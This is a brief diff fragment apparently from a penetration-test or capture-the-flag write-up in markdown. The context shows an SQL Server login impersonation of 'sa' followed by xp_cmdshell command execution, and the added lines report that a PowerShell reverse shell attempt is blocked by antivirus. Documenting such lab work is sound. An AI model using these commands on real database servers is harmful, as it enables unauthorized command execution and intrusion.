@@ -254,5 +254,9 @@ However the user does not have SeImpersonatePrivilege
 EXECUTE AS LOGIN = 'sa'; EXEC xp_cmdshell 'whoami';
 ```
 
+![](Pasted%20image%2020261003141536.png)
+
+A powershell reverse shell payload fails, it gets blocked by AV
+
 
 
